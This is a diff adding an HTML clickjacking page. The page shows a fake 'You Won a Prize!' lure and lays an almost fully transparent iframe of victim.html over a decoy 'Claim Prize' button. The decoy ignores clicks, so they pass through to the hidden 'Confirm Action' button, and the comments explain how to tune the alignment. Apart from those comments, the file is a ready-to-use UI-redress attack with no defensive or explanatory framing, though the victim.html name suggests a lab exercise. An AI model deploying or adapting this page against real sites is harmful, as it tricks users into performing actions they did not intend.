@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>You Won a Prize!</title>
+<style>
+  body {
+    font-family: Arial, sans-serif; text-align: center;
+    margin-top: 120px; background: #fff8e1;
+  }
+  h1 { color: #d69e2e; }
+  .decoy-wrap {
+    position: relative;
+    width: 170px; height: 44px;
+    margin: 24px auto;
+  }
+  /* The real vulnerable page, made invisible and positioned so its
+     "Confirm Action" button lands exactly over the decoy button below.
+     Tweak top/left if the alignment drifts in your browser/zoom level. */
+  iframe {
+    position: absolute;
+    top: -199px; left: -15px;
+    width: 400px; height: 300px;
+    border: none;
+    opacity: 0.001; /* invisible but still clickable */
+  }
+  /* Decoy sits visually on top but ignores clicks, so they fall
+     through to the real button in the iframe underneath. */
+  .decoy-btn {
+    position: absolute; top: 0; left: 0;
+    width: 170px; height: 44px;
+    background: #e53e3e; color: #fff; border: none; border-radius: 6px;
+    font-size: 17px; cursor: pointer;
+    pointer-events: none;
+  }
+</style>
+</head>
+<body>
+<h1>Congratulations!</h1>
+<p>You've been selected for a free prize.<br>Click below to claim it.</p>
+<div class="decoy-wrap">
+  <iframe src="victim.html"></iframe>
+  <button class="decoy-btn">Claim Prize</button>
+</div>
+</body>
+</html>
